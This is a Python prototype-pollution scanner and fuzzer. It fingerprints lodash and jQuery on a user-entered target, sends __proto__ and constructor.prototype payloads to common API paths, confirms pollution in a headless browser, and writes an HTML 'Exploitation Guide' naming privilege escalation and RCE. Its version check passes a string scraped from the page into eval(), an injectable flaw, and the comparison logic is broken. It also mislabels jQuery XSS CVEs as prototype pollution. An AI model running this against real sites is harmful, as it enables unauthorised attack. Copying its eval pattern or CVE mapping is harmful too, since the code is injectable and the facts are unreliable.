import requests, re, os, uuid
from urllib.parse import urljoin, urlencode
from playwright.sync_api import sync_playwright
from bs4 import BeautifulSoup
from jinja2 import Template

# === CVE MAPPING DATABASE (Simple) ===
LIB_VULNS = {
    "lodash": {
        "versions": ["<4.17.13", "<4.17.20"],
        "payloads": [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}}
        ],
        "cves": ["CVE-2018-3721", "CVE-2019-10744"]
    },
    "jquery": {
        "versions": ["<3.4.0"],
        "payloads": [
            {"__proto__[polluted]": "true"},
            {"__proto__.polluted": "true"}
        ],
        "cves": ["CVE-2020-11022", "CVE-2020-11023"]
    }
}

# === FUZZING ===
HEADERS = {"Content-Type": "application/json"}
FUZZ_PATHS = ["/api/", "/config", "/v1", "/debug", "/data", "/search"]
METHODS = ["GET", "POST"]

# === HTML TEMPLATE ===
HTML_TEMPLATE = """
<!DOCTYPE html><html><head><meta charset="UTF-8">
<title>Prototype Pollution Scanner Report</title>
<style>
body { font-family: sans-serif; background: #111; color: #eee; padding: 20px; }
h1 { color: #ff4081; }
code { background: #222; padding: 4px; border-radius: 5px; }
.success { color: #00ff99; }
.vuln { color: #ff5c5c; font-weight: bold; }
pre { background: #1e1e1e; padding: 10px; border-radius: 10px; overflow-x: auto; }
</style></head>
<body>
<h1>🧬 Pollution Scan Report</h1>
<p><strong>Target:</strong> {{ target }}</p>

<h2>🛠️ Detected JS Libraries</h2>
<ul>
{% for lib in libs %}
  <li><code>{{ lib.name }} {{ lib.version }}</code>
  {% if lib.vulnerable %}
    <span class="vuln">(Vulnerable - {{ lib.cves | join(', ') }})</span>
  {% endif %}
  </li>
{% endfor %}
</ul>

<h2>🚨 Confirmed Polluted Properties</h2>
{% if polluted %}
  <ul>{% for prop in polluted %}
    <li class="success"><code>{{ prop }}</code></li>
  {% endfor %}</ul>
{% else %}
  <p>No prototype pollution detected in runtime.</p>
{% endif %}

<h2>🧪 Payloads Used</h2>
<pre>{{ payloads }}</pre>

<h2>💥 Exploitation Guide</h2>
{% for lib in libs if lib.vulnerable %}
<pre>
Vulnerability: Prototype Pollution via {{ lib.name }}

CVE(s): {{ lib.cves | join(', ') }}
Detected Version: {{ lib.version }}

Description:
{{ lib.name }} versions {{ lib.version }} allow attackers to modify the global Object prototype by injecting special keys like "__proto__" or "constructor.prototype" into objects passed to insecure deep merge functions.

Exploitation:
1. Inject this payload into a vulnerable endpoint:
   {{ lib.payloads[0] }}

2. Trigger the backend or frontend code that uses:
   - lodash.merge(), _.defaultsDeep(), jQuery.extend(), or similar.

3. Confirm success:
   Open the browser console and type:
     console.log({}.polluted);  // Should return "true"

4. Impact:
   - Escalate privileges (e.g., isAdmin bypass)
   - Tamper with all objects in scope
   - Potential RCE in edge cases

Mitigation:
- Upgrade {{ lib.name }} to a patched version (e.g., >= 4.17.21 for Lodash)
- Block keys: "__proto__", "constructor", "prototype"
- Use secure deep merge libraries

CVE References:
{% for cve in lib.cves %}
- https://cve.mitre.org/cgi-bin/cvename.cgi?name={{ cve }}
{% endfor %}
</pre>
{% endfor %}

</body></html>
"""


# === SCRIPT PARSER TO DETECT VULNERABLE LIBRARIES ===
def detect_js_libs(page_source):
    soup = BeautifulSoup(page_source, "html.parser")
    scripts = [s.get("src") for s in soup.find_all("script") if s.get("src")]
    detected = []
    for src in scripts:
        if any(lib in src for lib in LIB_VULNS):
            for lib in LIB_VULNS:
                if lib in src:
                    match = re.search(r"(\d+\.\d+\.\d+)", src)
                    version = match.group(1) if match else "unknown"
                    vuln = any(eval(f"'{version}' {op} '{v}'") for v in LIB_VULNS[lib]["versions"] for op in ["<"])
                    detected.append({
                        "name": lib,
                        "version": version,
                        "vulnerable": vuln,
                        "cves": LIB_VULNS[lib]["cves"] if vuln else []
                    })
    return detected

# === FUZER ===
def send_payloads(target, payloads):
    for path in FUZZ_PATHS:
        url = urljoin(target, path)
        for payload in payloads:
            for method in METHODS:
                try:
                    if method == "GET":
                        r = requests.get(url, params=payload, timeout=5)
                    else:
                        r = requests.post(url, json=payload, headers=HEADERS, timeout=5)
                    print(f"[+] {method} {r.url} -> {r.status_code}")
                except Exception as e:
                    print(f"[!] {method} {url} failed: {e}")

# === RUNTIME CONFIRMATION ===
def browser_check(target):
    polluted = []
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()
        try:
            page.goto(target, timeout=10000)
            keys = page.evaluate("""
                () => {
                    let found = [];
                    for (let k in {}) {
                        if (['polluted'].includes(k)) found.push(k);
                    }
                    return found;
                }
            """)
            if keys:
                polluted.extend(keys)
        except Exception as e:
            print(f"[!] Browser error: {e}")
        finally:
            browser.close()
    return polluted

# === HTML REPORT ===
def write_report(target, libs, polluted, payloads):
    fname = f"pollution_report_{uuid.uuid4().hex[:6]}.html"
    html = Template(HTML_TEMPLATE).render(target=target, libs=libs, polluted=polluted, payloads=payloads)
    with open(fname, "w") as f:
        f.write(html)
    print(f"[+] HTML report written: {fname}")
    os.startfile(fname) if os.name == 'nt' else os.system(f"open {fname}")

# === MAIN ===
if __name__ == "__main__":
    print("==🧠 Prototype Pollution CVE+Payload Scanner==")
    target = input("Enter target URL (e.g., https://example.com): ").strip()
    if not target.startswith("http"):
        target = "http://" + target

    # Get HTML source and detect libs
    try:
        r = requests.get(target, timeout=10)
        libs = detect_js_libs(r.text)
    except Exception as e:
        print(f"[!] Failed to fetch target: {e}")
        libs = []

    # Gather payloads
    all_payloads = []
    for lib in libs:
        if lib["vulnerable"]:
            all_payloads.extend(LIB_VULNS[lib["name"]]["payloads"])

    if not all_payloads:
        all_payloads = [
            {"__proto__": {"polluted": "true"}},
            {"constructor": {"prototype": {"polluted": "true"}}},
            {"__proto__.polluted": "true"}
        ]

    # Send payloads to common paths
    send_payloads(target, all_payloads)

    # Confirm pollution
    polluted_props = browser_check(target)

    # Report
    write_report(target, libs, polluted_props, all_payloads)
